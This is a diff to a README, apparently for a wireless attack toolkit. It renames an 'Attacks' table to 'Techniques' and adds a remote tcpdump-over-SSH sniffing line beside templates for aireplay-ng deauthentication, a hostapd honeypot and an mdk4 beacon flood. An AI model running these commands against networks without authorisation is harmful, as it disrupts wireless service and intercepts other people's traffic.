@@ -54,13 +54,14 @@
 
 <br />
 
-## Attacks
+## Techniques
 
-|Type of attack|Command|
+|Type of technques|Command|
 |---------------|-------------|
 |Deathentication Attack|aireplay-ng -0 {count} -a {bssid} {interface} -c {sta_mac}|
 |WiFi HoneyPot|hostapd {config_file}|
 |Beacon flood|mdk4 {interface} b|
+|Remote Sniffing|ssh user@remotehost tcpdump -U -i {interface} -w - \| wireshark -k -i - |
 
 
 <br />
